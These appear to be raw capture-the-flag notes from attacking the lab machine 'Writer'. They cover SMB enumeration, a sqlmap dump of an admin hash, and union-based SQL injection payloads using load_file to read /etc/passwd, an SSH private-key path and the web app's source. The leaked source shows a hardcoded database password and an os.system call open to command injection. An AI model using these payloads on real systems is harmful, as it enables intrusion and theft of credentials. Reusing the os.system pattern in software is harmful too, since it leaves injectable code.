PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 98:20:b9:d0:52:1f:4e:10:3a:4a:93:7e:50:bc:b8:7d (RSA)
|   256 10:04:79:7a:29:74:db:28:f9:ff:af:68:df:f1:3f:34 (ECDSA)
|_  256 77:c4:86:9a:9f:33:4f:da:71:20:2c:e1:51:10:7e:8d (ED25519)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Story Bank | Writer.HTB
|_http-server-header: Apache/2.4.41 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel



└─$ netexec smb 10.129.168.241 -u guest -p '' --shares
SMB         10.129.168.241  445    WRITER           [*] Unix - Samba (name:WRITER) (domain:) (signing:False) (SMBv1:None) (Null Auth:True)
SMB         10.129.168.241  445    WRITER           [+] \guest: (Guest)
SMB         10.129.168.241  445    WRITER           [*] Enumerated shares
SMB         10.129.168.241  445    WRITER           Share           Permissions     Remark
SMB         10.129.168.241  445    WRITER           -----           -----------     ------
SMB         10.129.168.241  445    WRITER           print$                          Printer Drivers
SMB         10.129.168.241  445    WRITER           writer2_project                 
SMB         10.129.168.241  445    WRITER           IPC$                            IPC Service (writer server (Samba, Ubuntu))


─$ sqlmap -u 'http://writer.htb/administrative' --forms  -D writer  -T users --dump
+----+------------------+----------+----------------------------------+----------+--------------+
| id | email            | status   | password                         | username | date_created |
+----+------------------+----------+----------------------------------+----------+--------------+
| 1  | admin@writer.htb | Active   | 118e48794631a9612484ca8b55f622d0 | admin    | NULL         |
+----+------------------+----------+----------------------------------+----------+--------------+

118e48794631a9612484ca8b55f622d0



POST /administrative HTTP/1.1
Host: writer.htb
Content-Length: 71
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://writer.htb
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://writer.htb/administrative
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

uname=' union select 1,load_file("/etc/passwd"),3,4,5,6;--&password=qwe 

<h3 class="animation-slide-top">Welcome root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
kyle:x:1000:1000:Kyle Travis:/home/kyle:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
postfix:x:113:118::/var/spool/postfix:/usr/sbin/nologin
filter:x:997:997:Postfix Filters:/var/spool/filter:/bin/sh
john:x:1001:1001:,,,:/home/john:/bin/bash
mysql:x:114:120:MySQL Server,,,:/nonexistent:/bin/false


uname=' union select 1,load_file("/home/kyle/.ssh/id_rsa"),3,4,5,6;--&password=qwe

None

uname=' union select 1,load_file("/etc/nginx/sites-enabled/000-default.conf"),3,4,5,6;--&password=qwe
None

"animation-slide-top">Welcome # Virtual host configuration for writer.htb domain
&lt;VirtualHost *:80&gt;
        ServerName writer.htb
        ServerAdmin admin@writer.htb
        WSGIScriptAlias / /var/www/writer.htb/writer.wsgi
        &lt;Directory /var/www/writer.htb&gt;
                Order allow,deny
                Allow from all
        &lt;/Directory&gt;
        Alias /static /var/www/writer.htb/writer/static
        &lt;Directory /var/www/writer.htb/writer/static/&gt;
                Order allow,deny
                Allow from all
        &lt;/Directory&gt;
        ErrorLog ${APACHE_LOG_DIR}/error.log
        LogLevel warn
        CustomLog ${APACHE_LOG_DIR}/access.log combined
&lt;/VirtualHost&gt;



uname=' union select 1,load_file("/var/www/writer.htb/writer.wsgi"),3,4,5,6;--&password=qwe

 #!/usr/bin/python
import sys
import logging
import random
import os

# Define logging
logging.basicConfig(stream=sys.stderr)
sys.path.insert(0,&#34;/var/www/writer.htb/&#34;)

# Import the __init__.py from the app folder
from writer import app as application
application.secret_key = os.environ.get(&#34;SECRET_KEY&#34;, &#34;&#34;)
                                        


uname=' union select 1,load_file("/var/www/writer.htb/writer/__init__.py"),3,4,5,6;--&password=qwe

="animation-slide-top">Welcome from flask import Flask, session, redirect, url_for, request, render_template
from mysql.connector import errorcode
import mysql.connector
import urllib.request
import os
import PIL
from PIL import Image, UnidentifiedImageError
import hashlib

app = Flask(__name__,static_url_path=&#39;&#39;,static_folder=&#39;static&#39;,template_folder=&#39;templates&#39;)

#Define connection for database
def connections():
    try:
        connector = mysql.connector.connect(user=&#39;admin&#39;, password=&#39;ToughPasswordToCrack&#39;, host=&#39;127.0.0.1&#39;, database=&#39;writer&#39;)
        return connector
    except mysql.connector.Error as err:
        if err.errno == errorcode.ER_ACCESS_DENIED_ERROR:
            return (&#34;Something is wrong with your db user name or password!&#34;)
        elif err.errno == errorcode.ER_BAD_DB_ERROR:
            return (&#34;Database does not exist&#34;)
        else:
            return (&#34;Another exception, returning!&#34;)
    else:
        print (&#39;Connection to DB is ready!&#39;)

#Define homepage
@app.route(&#39;/&#39;)
def home_page():
    try:
        connector = connections()
    except mysql.connector.Error as err:
            return (&#34;Database error&#34;)
    cursor = connector.cursor()
    sql_command = &#34;SELECT * FROM stories;&#34;
    cursor.execute(sql_command)
    results = cursor.fetchall()
    return render_template(&#39;blog/blog.html&#39;, results=results)

user=&#39;admin&#39;, password= ToughPasswordToCrack


if request.form.get('image_url'):
            image_url = request.form.get('image_url')
            if ".jpg" in image_url:
                try:
                    local_filename, headers = urllib.request.urlretrieve(image_url)
                    os.system("mv {} {}.jpg".format(local_filename, local_filename))
                    image = "{}.jpg".format(local_filename)
